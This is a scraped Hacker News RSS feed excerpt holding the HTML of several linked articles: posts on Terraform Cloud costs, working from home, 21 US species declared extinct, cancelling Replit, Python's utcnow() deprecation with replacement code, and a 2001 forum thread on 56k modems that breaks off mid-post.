<figure><img decoding="async" loading="lazy" width="896" height="512" src="https://shavingtheyak.com/wp-content/uploads/2023/11/moneyvac1.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/moneyvac1.png 896w, https://shavingtheyak.com/wp-content/uploads/2023/11/moneyvac1-300x171.png 300w, https://shavingtheyak.com/wp-content/uploads/2023/11/moneyvac1-768x439.png 768w, https://shavingtheyak.com/wp-content/uploads/2023/11/moneyvac1-850x486.png 850w" sizes="(max-width: 896px) 100vw, 896px"></figure>
<p>All jokes aside, this also seems to be eerily similar to the cloud services business model doesn’t it? How many companies started out using cloud services because of the convenience, flexibility and scalability of services, yet discovered years later that they are stuck paying enormous monthly sums to maintain their infrastructure in the cloud? Every little piece of it costs money, and it adds up, like a financial torture device, over time. How many times have we heard the argument about how much cheaper the cloud is due to ‘reasons’ only to discover later that we are seemingly paying the full up-front cost of a real server in 8 months when using one in the cloud? I haven’t seen any stories yet about companies moving from the cloud back to on-prem where they discover, to their surprise, that they have increased their overhead costs. It seems to be a common theme. Start small in the cloud, and if you get big later once your infrastructure footprint becomes stable, realize huge savings moving back to your own servers. Terraform Cloud now seems to work the same way.</p>
<p>The difference here is size, complexity and the fact that Terraform itself is/was open source. With the recent fork to open tofu, and the need for something like Terraform Cloud, I wouldn’t at all be surprised if someone creates a self-hosted clone of TFC and some companies start to use it instead. Only time will tell. In the meantime, we will be evaluating replacement solutions, hoping that in the end whatever we end up using doesn’t also suddenly change underneath us, requiring yet another large and complex migration project. Maybe some of the companies offering replacement services can do the migrations for free to get our business?</p>
<hr>
<p>-AD-</p>
<p>You may know that <a href="http://namecheap.pxf.io/oqJ7q9" data-type="link" data-id="https://namecheap.pxf.io/VmdGm3" target="_blank" rel="noreferrer noopener">Namecheap</a> does domain names, right? Did you also know that they do:</p>
<ul>
<li>Low Cost Server and Site Hosting</li>
<li>CDN</li>
<li>DNS</li>
<li>Managed WordPress Hosting</li>
<li>Marketing</li>
<li>Email Solutions</li>
<li>Anti-Spam Solutions</li>
<li>Personal VPN</li>
<li>Cyber Insurance?</li>
</ul>
<p>The <em>internet isn’t free</em>, so why spend more than you need to on your internet services?</p>
<p>Check out <a rel="noreferrer noopener" href="http://namecheap.pxf.io/oqJ7q9" data-type="link" data-id="https://namecheap.pxf.io/VmdGm3" target="_blank">NameCheap’s</a> Offerings Today!</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I will always prefer to work from home (239 pts)]]></title>
            <link>https://shavingtheyak.com/2023/10/25/wfh-part1/</link>
            <guid>38334084</guid>
            <pubDate>Sun, 19 Nov 2023 16:21:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://shavingtheyak.com/2023/10/25/wfh-part1/">https://shavingtheyak.com/2023/10/25/wfh-part1/</a>, See on <a href="https://news.ycombinator.com/item?id=38334084">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text">

<figure><img decoding="async" fetchpriority="high" width="896" height="512" src="https://shavingtheyak.com/wp-content/uploads/2023/11/wfh1.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/wfh1.png 896w, https://shavingtheyak.com/wp-content/uploads/2023/11/wfh1-300x171.png 300w, https://shavingtheyak.com/wp-content/uploads/2023/11/wfh1-768x439.png 768w, https://shavingtheyak.com/wp-content/uploads/2023/11/wfh1-850x486.png 850w" sizes="(max-width: 896px) 100vw, 896px"></figure>
<p>I’ve been working from home since long before the pandemic. It’s been almost 10 years of partial ‘wfh’ and 6 years of full time ‘wfh’ for me, and frankly I don’t see it ever changing on my end, without threats of physical violence or bags of money.</p>
<p>Some folks really missed the office social club when the shutdown happened, and I get that. But being a ‘tech person’ who needs to focus on things in a deep way, and having to share some open plan office space with a hundred other people every day… The two things just don’t mix well. In addition, being in the DevOps/SRE space means that I often need space to bang my head against the wall (figuratively of course) or yell out about the injustice of yet another bug in a Terraform provider that I don’t have the time to upgrade from.</p>
<p>There’s just no way the tradeoff of going back to an office would work for me. Lets look at the two sides here from my perspective and see how it might compare to yours:</p>
<div>
<div>
<figure><p data-align="center"><strong>The Office</strong></p></figure>
<ul>
<li>Noisy, tends to be either a ghost town or crowded, depending on the day.</li>
<li>Some distance away, requiring anywhere from 30-90 minutes a day on average commute. You will never get this time back. Lets not talk about climate change, either.</li>
<li>Vehicle and toll road costs can add up. In my area I would spend $200/mo on tolls just to drive to an office.</li>
<li>Just when I am deep in some twisted train of thought involving a failing JS callback or missing network packets in Kubernetes someone ambles over to my cubicle to ask me some random question about helm that they could have answered in 2 seconds using the search function of their web browser. Train derailed.</li>
<li>Ever have a bad boss that you are certain will be a later source of your soon to happen PTSD? Good luck getting away from this person at the office.</li>
<li>The coffee. Honestly folks, don’t cheap out on the coffee at the office. Sometimes office coffee can be good, but after a round of budget cuts or layoffs it tends to end up as collateral damage.</li>
<li>Child emergency? Parent in the hospital? It’s tough to deal with these at an office. If only there was a way you could just go somewhere else more convenient to get both things done without endangering your next promotion or performance review…</li>
</ul>
</div>
<div>
<figure><p data-align="center"><strong>WFH</strong></p></figure>
<ul>
<li>As noisy or quiet as I darn well want it to be.</li>
<li>My cats may or may not be allowed to attend standup, depending on who is present that day</li>
<li>If I feel like a nice cool Bernie 60 degrees or a sunny so-cal 78, I walk over to the temp control and make it so. Try that at the office and see what happens.</li>
<li>My office at home is a dedicated space to my work. Once you add in the 4 monitors, personal artwork, extra large desk, soft couch, exercise equipment and drink fridge – it’s clear that I would have to be in the C suite to normally afford such luxury at ‘the office’.</li>
<li>That 30-90 minutes of time wasted every day commuting to an office? I exercise, meditate, or do other important things that otherwise would be blocked by excuses or general end of day lethargy. If something breaks in prod – hey I’m right there to fix it anyway, without fuss, after hours if needed.</li>
<li>Why would I take a sick day if I can still sit at my chair and work? No need to wear a mask during standup either, unless I catch some wild new zoom-transmitted virus. If I feel tired – hey look, there’s a nice couch right there and I can still get some work done.</li>
</ul>
</div>
</div>
<figure><img decoding="async" width="717" height="410" src="https://shavingtheyak.com/wp-content/uploads/2023/11/wfh_or_not1.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/wfh_or_not1.png 717w, https://shavingtheyak.com/wp-content/uploads/2023/11/wfh_or_not1-300x172.png 300w" sizes="(max-width: 717px) 100vw, 717px"></figure>
<p>Management’s arguments against WFH:</p>
<ol>
<li>“<strong>Workers aren’t as productive at home</strong>” – Some workers. Probably the same workers who weren’t productive at the office either, but since there wasn’t anything in place to measure that anyway other than the ‘butt in seat’ metric, now they seem to be AWOL. If you can’t measure your employee’s productivity and hold them accountable to that outside of an office, then what are you managing?</li>
<li>“<strong>People need to collaborate more to be innovative</strong>” – Don’t talk to me about collaboration when I sometimes have to turn off slack to be able to hear myself think. Yes I agree in principle that it may be easier to randomly chat about technical subjects walking around the office but in that case am I getting work done? Could I have just messaged someone instead and gotten the same answer, allowing them to respond when they had the mental bandwidth to do so? Brainstorming also works better from the couch, just saying.</li>
<li>“<strong>People need to be in the office to be a part of the TEAM</strong>” – This may actually be somewhat true. I don’t feel as much a part of the company, the team when I work from my home office. I feel more like a lone agent, fulfilling my own need to have a work ethic and trying to do what ‘s right for our customers. Of course I’m on a team, but I wouldn’t be that upset if a new job showed up and I decided to take it. After all, my office doesn’t even change. I would probably miss the corporate culture of course, if I already like my job, but I certainly won’t feel guilty about getting a better job if I am unhappy. I suspect that many people who aren’t happy with their jobs stay with them out of a sense of attachment to the social nature of the office and the familiarity of the office workplace – and on some level, management knows this.</li>
</ol>
<hr>
<p>This gets at a much deeper issue, however. <strong>Should</strong> we be loyal to companies who would lay us off at the drop of a hat to pad their quarterly earnings? Companies who decide the projects we work on have no merit but can’t be bothered to reassign us to more critical work after spending the time and money to get us in the door? Many of us feel the need to be loyal but what are we getting in return?</p>
<figure><img decoding="async" width="896" height="512" src="https://shavingtheyak.com/wp-content/uploads/2023/11/layoffs1.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/layoffs1.png 896w, https://shavingtheyak.com/wp-content/uploads/2023/11/layoffs1-300x171.png 300w, https://shavingtheyak.com/wp-content/uploads/2023/11/layoffs1-768x439.png 768w, https://shavingtheyak.com/wp-content/uploads/2023/11/layoffs1-850x486.png 850w" sizes="(max-width: 896px) 100vw, 896px"></figure>
<p>In tech, you can also hurt your career if you stay with a legacy stack for too long, and your skillset no longer matches the needs of the marketplace. Don’t want to get caught out on the next round of layoffs without being good at some new technology? Better start looking now for a company willing to use your skillset to help them move to that new technology from the old one.</p>
<p>When it comes time for a possible raise, how many companies still give them out, and when they do are they enough to mitigate the cost of living increases due to inflation?</p>
<p>In a way, companies in today’s market by their behavior drive employees to look for other jobs to get a raise or improve their skillset. There is little investment in employees or their future beyond the HR skill training website and generally you are considered a ‘cog in the machine’ – I don’t think we should be loyal to that sort of setup or treatment. I don’t really know why or how things got this way, but if you work for a company that is not like this – consider yourself lucky.</p>
<hr>
<p>-AD-</p>
<p>You may know that <a href="https://namecheap.pxf.io/VmdGm3" data-type="link" data-id="https://namecheap.pxf.io/VmdGm3" target="_blank" rel="noreferrer noopener">Namecheap</a> does domain names, right? Did you also know that they do:</p>
<ul>
<li>Low Cost Server and Site Hosting</li>
<li>CDN</li>
<li>DNS</li>
<li>Managed WordPress Hosting</li>
<li>Marketing</li>
<li>Email Solutions</li>
<li>Anti-Spam Solutions</li>
<li>Personal VPN</li>
<li>Cyber Insurance?</li>
</ul>
<p>The <em>internet isn’t free</em>, so why spend more than you need to on your internet services?</p>
<p>Check out <a rel="noreferrer noopener" href="https://namecheap.pxf.io/VmdGm3" data-type="link" data-id="https://namecheap.pxf.io/VmdGm3" target="_blank">NameCheap’s</a> Offerings Today!</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[U.S. Agency Declares 21 Species Now Extinct L (138 pts)]]></title>
            <link>https://www.pbsnc.org/blogs/science/us-agency-declares-21-species-now-extinct/</link>
            <guid>38333790</guid>
            <pubDate>Sun, 19 Nov 2023 15:56:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pbsnc.org/blogs/science/us-agency-declares-21-species-now-extinct/">https://www.pbsnc.org/blogs/science/us-agency-declares-21-species-now-extinct/</a>, See on <a href="https://news.ycombinator.com/item?id=38333790">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id=""><h2>A Wake-Up Call to Conserve Endangered Wildlife</h2><p>The <a href="https://www.fws.gov/" target="_blank" rel="noopener noreferrer"><u>U.S. Fish and Wildlife Service (FWS)</u></a> has announced that 21 species once deemed “endangered” by the <a href="https://www.fws.gov/law/endangered-species-act" target="_blank" rel="noopener noreferrer"><u>Endangered Species Act (ESA)</u></a> are now extinct. Officially, this process is called “delisting species due to extinction.”&nbsp;</p><p>&nbsp;Unofficially, you could say the species are dead and never to be seen again.&nbsp;</p><p>The agency says it has determined that the species are extinct (based on reviews of the best available science for each species) and should be removed from protection under the ESA.&nbsp;</p><p>“Our determination of whether the best available information indicates that a species is extinct included an analysis of the following criterion: detectability of the species, adequacy of survey efforts and the time since last detection,” the agency said in a statement.&nbsp;&nbsp;</p><p>Most of the species were listed as endangered under the ESA in the 1970s and 1980s; at the time of the listing, the species were in exceptionally small numbers or extinct.&nbsp;</p><p>“My heart breaks over the loss of these 21 species,” said <a href="https://www.biologicaldiversity.org/about/staff/" target="_blank" rel="noopener noreferrer"><u>Noah Greenwald</u></a>, endangered species director at the <a href="https://www.biologicaldiversity.org/" target="_blank" rel="noopener noreferrer"><u>Center for Biological Diversity</u></a>. “These plants and animals can never be brought back. We absolutely must do everything we can to avert the loss of even more threads in our web of life.”&nbsp;</p><h3>One Extinct Songbird Once Lived in NC&nbsp;</h3><p>The extinct species includes eight birds of Hawaii’s honeycreepers, the bridled white-eye bird, the Little Mariana fruit bat (also known as the Guam flying fox), a one-inch-long Texas fish known as the San Marcos gambusia, nine southeastern mussels, the Scioto Madtom (a catfish found only in one river in Ohio) and the Bachman’s warbler, an insect-eating songbird that called the swamps of the Carolinas its home.&nbsp;</p><p>According to Greenwald, “The bird had a ‘buzzy’ song, and the song added to the beauty of the bird, and when combined that added to the magic of North Carolina. We lost a little magic when we lost the species. And what’s really sad is that the Bachman’s warbler was abundant at the turn of the 20th<sup></sup>century, but by 1950 it was noted as one of the rarest birds in North America.”&nbsp;</p><p>Greenwald says the bird’s extinction is largely due to habitat destruction. The swamps where it lived were converted to farmland, and its trees were cut down for logging. Additionally, people used to shoot the birds and collect their feathers for hats.&nbsp;</p><p>According to FWS, there have been no officially accepted, documented observations of the Bachman’s warbler in the United States since 1962. The bird was last spotted in Cuba in the 1980s.&nbsp;</p><h3>The Extinction List Continues to Grow&nbsp;</h3><p>The FWS declared 23 other species as extinct in 2021. Greenwald says there are now 650 species that have gone extinct in the U.S. due to a combination of factors, including habitat loss, climate change, pollution and invasive species.&nbsp;</p><p>Around the world, 902 species have been documented as extinct. However, the actual number is thought to be much higher because some species have never been formally identified. Also, many scientists warn the earth is in an “extinction crisis” with flora and fauna now disappearing at 1,000 times the historical rate.&nbsp;</p><p>While the droughts, wildfires, floods and temperature swings associated with climate change are making species recovery harder, the good news is that it is also changing how scientists are working to save species.&nbsp;</p><p>Greenwald adds the focus is no longer on individual species, such as a particular bird. The broader goal now is to preserve their habitat, which can help species of all types to live there. That new focus, combined with the protections afforded by the Endangered Species Act, may help keep more species off the extinction list.&nbsp;</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I cancelled my Replit subscription (166 pts)]]></title>
            <link>https://journal.paoloamoroso.com/why-i-cancelled-my-replit-subscription</link>
            <guid>38333271</guid>
            <pubDate>Sun, 19 Nov 2023 15:06:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://journal.paoloamoroso.com/why-i-cancelled-my-replit-subscription">https://journal.paoloamoroso.com/why-i-cancelled-my-replit-subscription</a>, See on <a href="https://news.ycombinator.com/item?id=38333271">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-body"><time datetime="2023-11-19T14:33:22Z" pubdate="" itemprop="datePublished" content="2023-11-19 14:33:22 +0000 UTC">November 19, 2023</time><div><p>I cancelled my annual Replit Hacker plan and I'll let it lapse at the end of December of 2023.</p>

<p><a href="https://replit.com/">Replit</a> is a popular and growing multi language development environment in the cloud. I've been subscribing to the Hacker plan for the past few years and it worked well for <a href="https://journal.paoloamoroso.com/tag:Python">my Python projects</a>, as such an online environment is a good match for my chromeOS lifestyle. But two changes made me reconsider the value of the product.</p>

<p>The first is Replit changed its paid tiers by raising the price of my plan and removing some features. I actually saw it coming when Replit began receiving massive funding by major investors, who are likely pressuring the company to reduce costs and turn profits. Still, this left a sour taste as it felt like a bait and switch.</p>

<p>The other change is <a href="https://journal.paoloamoroso.com/back-to-lisp">my shift of focus back to Lisp</a>, the programming language I love most and know best.</p>

<p>Replit doesn't work well with a highly interactive language like Lisp. It doesn't directly support any Lisp dialects and its default code editor provides little or no integration with a running Lisp image. Moreover, the files created or uploaded outside of the editor are often not preserved across sessions. If I have to install and maintain a full Lisp system in the Linux shell of a Replit workspace, I might as well install it locally on my desktop computer.</p>

<p>Finally, like other development tool vendors, Replit is doubling down on AI coding features which affect the cost of paid plans. But I'm not interested in this as the whole point of my hobby programming is to write all the code myself and learn from the experience.</p>

<p><a href="https://journal.paoloamoroso.com/tag:development"><span>#</span><span>development</span></a> <a href="https://journal.paoloamoroso.com/tag:Python"><span>#</span><span>Python</span></a> <a href="https://journal.paoloamoroso.com/tag:Lisp"><span>#</span><span>Lisp</span></a></p>

<p><a href="https://remark.as/p/journal.paoloamoroso.com/why-i-cancelled-my-replit-subscription">Discuss...</a>
<a href="mailto:info@paoloamoroso.com?subject=Reply%20to%20Paolo%20Amoroso%27s%20Journal">Email</a> | Reply <a href="https://journal.paoloamoroso.com/@/amoroso@fosstodon.org">@<span>amoroso@fosstodon.org</span></a></p>


</div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[It's time for a change: datetime.utcnow() is now deprecated (197 pts)]]></title>
            <link>https://blog.miguelgrinberg.com/post/it-s-time-for-a-change-datetime-utcnow-is-now-deprecated</link>
            <guid>38333116</guid>
            <pubDate>Sun, 19 Nov 2023 14:49:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.miguelgrinberg.com/post/it-s-time-for-a-change-datetime-utcnow-is-now-deprecated">https://blog.miguelgrinberg.com/post/it-s-time-for-a-change-datetime-utcnow-is-now-deprecated</a>, See on <a href="https://news.ycombinator.com/item?id=38333116">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I was going through the <a href="https://docs.python.org/3/whatsnew/3.12.html">release notes</a> of the new Python 3.12 version the other day, and one item caught my attention in the deprecations section:</p>
<blockquote>
<p><code>datetime.datetime</code>’s <code>utcnow()</code> and <code>utcfromtimestamp()</code> are deprecated and will be removed in a future version.</p>
</blockquote>
<p>If you have followed my web development tutorials you must have seen me use <code>utcnow()</code> a lot, so I will clearly need to re-train myself to use an alternative, in preparation for the eventual removal of this function (likely a few years out, so no need to panic!).</p>
<p>In this short article I'll tell you more about why these functions are getting the axe, and what to replace them with.</p>
<h2>What's Wrong with utcnow() and utcfromtimestamp()?</h2>
<p>The problem that the Python maintainers have found comes from the fact that these functions return <a href="https://docs.python.org/3/library/datetime.html#aware-and-naive-objects">"naive" datetime objects</a>. A naive <code>datetime</code> object is one that does not have a timezone, which means that it can only be used in a context where the timezone does not matter or is already known in advance. This is in contrast to "aware" <code>datetime</code> objects, which do have a timezone attached to them explicitly.</p>
<p>If you ask me, I think the names of these functions are misleading. A function that is called <code>utcnow()</code> should be expected to return UTC datetimes, as implied by the name. I would have made it more clear that these functions work with naive time, maybe by calling them <code>naive_utcnow()</code> and <code>naive_utcfromtimestamp()</code>.</p>
<p>But their names are not the problem here. The specific issue is that some Python date and time functions accept naive timestamps and assume that they represent local time, according to the timezone that is configured on the computer running the code. There is a <a href="https://github.com/python/cpython/issues/81669">GitHub issue from 2019</a> that provides some background into this, with the following example:</p>
<pre><code>&gt;&gt;&gt; from datetime import datetime
&gt;&gt;&gt; dt = datetime.utcfromtimestamp(0)
&gt;&gt;&gt; dt
datetime.datetime(1970, 1, 1, 0, 0)
&gt;&gt;&gt; dt.timestamp()
18000
</code></pre>
<p>The example above was executed on a computer that was configured for Eastern Standard Time (EST). First, <code>dt</code> is assigned a naive <code>datetime</code> that is converted from the "zero" time or <a href="https://en.wikipedia.org/wiki/Unix_time">UNIX epoch</a>, which is January 1st, 1970 at midnight.</p>
<p>When this object is converted back to a timestamp, the <code>dt.timestamp()</code> method finds that it does not have a timezone to use in the conversion, so it uses the computer's own timezone, which in this example was EST (note that the EST timezone is 5 hours, or 18,000 seconds behind UTC). So we have a UNIX timestamp that originated as midnight on January 1st, 1970, and after being converted to a <code>datetime</code> and back ends up as 5 am.</p>
<p>If you read the issue linked above, they suggest that this ambiguity did not exist in Python 2 and for that reason this was not a problem for a long time, but it now is and needs to be addressed. This sounded strange, so I had to go and check, and sure enough, the <code>timestamp()</code> method that returns the incorrect UNIX time in the example was introduced in Python 3.3 and nothing similar appears to have existed back in Python 2 times.</p>
<p>So basically, at some point they've added a <code>datetime.timestamp()</code> method (and possibly others as well) that accept both aware and naive datetimes and this was a mistake, because these methods must have a timezone to work.</p>
<p>These methods should have been designed to fail when a naive <code>datetime</code> object is passed to them, but for some strange reason they decided that when a timezone is not provided the timezone from the system should be used. This is really the bug, but instead of fixing the broken implementations of these methods they are now trying to force people to move to aware datetimes by deprecating the two main functions that generate naive ones. They think that because a few functions assume that naive timestamps represent local times, all naive uses that are not in local time should be discouraged.</p>
<p>I may be missing something here, but I don't really follow this logic.</p>
<h2>Do We Need Naive Datetimes Anyway?</h2>
<p>To me it is clear that the Python maintainers behind this deprecation have a problem with naive datetimes and are using this supposed problem as an excuse to cripple them.</p>
<p>So why would you want to work with naive datetimes in the first place?</p>
<p>An application may be designed in such a way that all dates and times are in a single timezone that is known in advance. In this case there is no need for individual <code>datetime</code> instances to carry their own timezones, since this uses more memory and processing power for no benefit, since all these timezones would be the same and it would never be necessary to perform timezone math or conversions.</p>
<p>This is actually very common in web applications or other types of networking servers, which are configured with <a href="https://en.wikipedia.org/wiki/Coordinated_Universal_Time">UTC</a> time and normalize all dates and times to this timezone when they enter the system. It is also a best practice to store naive datetimes representing UTC in databases. The <a href="https://docs.sqlalchemy.org/en/stable/core/type_basics.html#sqlalchemy.types.DateTime">DateTime</a> type in SQLAlchemy represents a naive <code>datetime</code> object by default, for example. This is such a common database pattern that SQLAlchemy provides a <a href="https://docs.sqlalchemy.org/en/20/core/custom_types.html#store-timezone-aware-timestamps-as-timezone-naive-utc">recipe</a> for applications that use aware <code>datetime</code> objects to convert these to and from naive ones on the fly as they are saved to or loaded from the database.</p>
<p>So yes, I expect naive <code>datetime</code> objects will continue to be used, in spite of these deprecations.</p>
<h2>Updating Your Code</h2>
<p>Even though the deprecations are disappointing, it is important to keep in mind that it may take a few years for the functions to actually be removed. The problem is that once you switch to Python 3.12 or newer you will start seeing deprecation messages on your console and your logs, and these can get annoying. Here is an example of what you can expect to see:</p>
<pre><code>$ python
Python 3.12.0 (main, Oct  5 2023, 10:46:39) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; from datetime import datetime
&gt;&gt;&gt; datetime.utcnow()
&lt;stdin&gt;:1: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
datetime.datetime(2023, 11, 18, 11, 22, 54, 263206)
</code></pre>
<p>I'm only using Python 3.12 in a small number of projects, and I'm already tired of seeing these warnings. So let's go ahead and look at how these two functions can be replaced.</p>
<p>The advice from the Python maintainers is to switch to aware <code>datetime</code> objects. The deprecation warning provides a hint of what they think we should use, and the deprecation notices included in the documentation are even more specific. Here is what the notice for the <code>utcnow()</code> function says:</p>
<blockquote>
<p>Deprecated since version 3.12: Use <code>datetime.now()</code> with <code>UTC</code> instead.</p>
</blockquote>
<p>Below you can see the one for <code>utcfromtimestamp()</code>:</p>
<blockquote>
<p>Deprecated since version 3.12: Use <code>datetime.fromtimestamp()</code> with <code>UTC</code> instead.</p>
</blockquote>
<p>So this gives us an idea of what can be done. Here are my custom versions of the deprecated functions, with the additional option to choose between aware or naive implementations:</p>
<pre><code>from datetime import datetime, timezone

def aware_utcnow():
    return datetime.now(timezone.utc)

def aware_utcfromtimestamp(timestamp):
    return datetime.fromtimestamp(timestamp, timezone.utc)

def naive_utcnow():
    return aware_utcnow().replace(tzinfo=None)

def naive_utcfromtimestamp(timestamp):
    return aware_utcfromtimestamp(timestamp).replace(tzinfo=None)

print(aware_utcnow())
print(aware_utcfromtimestamp(0))
print(naive_utcnow())
print(naive_utcfromtimestamp(0))
</code></pre>
<p>Note that if you are using Python 3.11 or newer, you can replace <code>datetime.timezone.utc</code> with a shorter <code>datetime.UTC</code>.</p>
<p>Running this script I get the following results:</p>
<pre><code>2023-11-18 11:36:35.137639+00:00
1970-01-01 00:00:00+00:00
2023-11-18 11:36:35.137672
1970-01-01 00:00:00
</code></pre>
<p>You can tell that the first and second lines show aware <code>datetime</code> instances from the <code>+00:00</code> suffix that indicates that the timezone is 00:00 or UTC. The third and fourth lines show abstract timestamps without a timezone, fully compatible with those returned by the deprecated functions.</p>
<p>What I like about these implementations is that they give you the choice to work with or without timezones, removing any ambiguity. Explicit is better than implicit, as <a href="https://peps.python.org/pep-0020/">the old adage</a> says.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Should I replace my 56k modem with a 28.8K Modem? (2001) (107 pts)]]></title>
            <link>https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/</link>
            <guid>38332788</guid>
            <pubDate>Sun, 19 Nov 2023 14:13:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/">https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/</a>, See on <a href="https://news.ycombinator.com/item?id=38332788">Hacker News</a></p>
<div id="readability-page-1" class="page">
		




		



		

		<div id="top">

				
					
	
	



					

					

					
						
						
							<header id="header">
								
							</header>
						
					
					

					
					
					

					
						
						

					

					
	

					
	

					
	
		
	

	

					
	

					
				

				
				

				
	


				<div>
						
						<!--XF:EXTRA_OUTPUT-->

						
	
		
	
		

		
	

	


						
	
		
	
		
			
			
		
	

	


						
	


						
	
		
	
	
	
		
	

	

	
	
	                          
	                        



	


						
	


						
	

						
	<div>You are using an out of date browser. It  may not display this or other websites correctly.<br>You should upgrade or use an <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">alternative browser</a>.</div>



						<div uix_component="MainContainer">
										
	

										
	

										
	

										
	

										
	

										














	
	
	
		
	
	
	


	
	
	
		
	
	
	


	
	
		
	
	
	


	
	












	

	
		
	





















<div data-xf-init="" data-type="post" data-href="/inline-mod/" data-search-target="*">

	<span id="posts"></span>

	
		
	

	

	

	

	
		
	

	

	

	
	
	                          
	                        


<div data-xf-init="lightbox select-to-quote" data-message-selector=".js-post" data-lb-id="thread-437516" data-lb-universal="1">
			
				



					

					
						

	


	

	

	

	
	<article data-author="shawnmos" data-content="post-959696" id="js-post-959696">

		<span id="post-959696"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959696" data-xf-init="share-tooltip" data-href="/posts/959696/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959696" rel="nofollow">
						#1
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-959696" data-lb-caption-desc="shawnmos · Jan 11, 2001 at 7:52 PM">

		
			

	

		

		<article>
			
				
			
			
				<div>Should I replace my onboard(well kinda) 56k winmodem with my old US Robotics 28.8k External modem? The reason I would ask such a thing is because the my first phone line (the one my computers are hooked up to) only connects at 24k because the line is split with someone else. They did this to my dads phone line (2nd line) too but he complamed to Sprint for 3 months straight and finally got them to fix <b>only</b> the second line (with a service charge. Motherfu*kers!!!!!! :| ). So I'm stuck with a internet connection that is SLOW AS HELL!!!! When I try to connect to the internet it takes like 5 min. because it tries to connect at 56K and it keeps trying until it finds a speed it can connect at. I can tell because it keeps making the connecting sound over and over. So hopefully the 28.8K modem will connect faster. Also since it's external it does not block a pci slot and frees up an IRQ because it uses the serial port. Also it isn't a winmodem. What do you think?<p>

P.S. Today my dad got a phone bill from Sprint with like a 1000 calls to the 941-999-999 in Fort Myers, FL for $0.25 each. Also there is a call to that number every min. for I don't know how many mins. A LOT!! Who in their right mind would call a non-existant # every min. for like 24hours straight?? Fu*king Sprint and their stupidity!!!!! I hope they rot in HELL!!!!</p></div>
			
			
			
				
			
		</article>

		
			

	

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                            
	                                
	                                  





	                                
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="jfall" data-content="post-959779" id="js-post-959779">

		<span id="post-959779"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959779" data-xf-init="share-tooltip" data-href="/posts/959779/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959779" rel="nofollow">
						#2
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-959779" data-lb-caption-desc="jfall · Jan 11, 2001 at 8:00 PM">

		

		<article>
			
				
			
			
				<div>I have been doing internet tech support for a long time, and to tell you the truth.. most people with 28.8 &amp;amp; 33.6 modems are able to connect much easier then a 56k v.90 modem, I hate v.90 with a passion, nothing but connection problems, and the long handshake that you are describing is probably being caused by the 56k modem.  They actually came out with the v.91 &amp;amp; v.92 protocols, it will be interesting to see how they work out.</div>
			
			
			
				
			
		</article>

		

		
	</div>

								

								
									
	

								
							</div>
		
	</article>

	
	

	
	
	                                    
	                        

	
	



					

					

				





					

					
						

	


	

	

	
	<article data-author="etech" data-content="post-959825" id="js-post-959825">

		<span id="post-959825"></span>

		
			<div>

								
									

	<header>
		

		<ul>
			
			<li>
				<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959825" data-xf-init="share-tooltip" data-href="/posts/959825/share" aria-label="Share" rel="nofollow">
					
				</a>
			</li>
			
			
				<li>
					<a href="https://forums.anandtech.com/threads/should-i-replace-my-56k-modem-with-a-28-8k-modem.437516/post-959825" rel="nofollow">
						#3
					</a>
				</li>
			
		</ul>
	</header>

								

								<div data-lb-id="post-959825" data-lb-caption-desc="etech · Jan 11, 2001 at 8:06 PM">

		

		<article>
			
				
			
			
				<div><a href="http://808hi.com/56k/trouble.htm" target="_blank" data-proxy-href="/proxy.php?link=http%3A%2F%2F808hi.com%2F56k%2Ftrouble.htm&amp;hash=c56d1b69030ff8882e14f3180f9a3881" rel="nofollow ugc noopener">troubleshooting</a><p>

shawnmos, you should be able to put in a code that will limit the speed of your on-board 56K modem.  That should allow it to connect better.  The site above has info to identify your chipset and what codes to use.</p><p>

 <a href="http://808hi.com/56k/x2-linklimit.htm" target="_blank" data-proxy-href="/proxy.php?link=http%3A%2F%2F808hi.com%2F56k%2Fx2-linklimit.htm&amp;hash=a04080b03104c9b80bd7350a0a740cbd" rel="nofollow ugc noopener">limiting your connect speed</a></p><p>
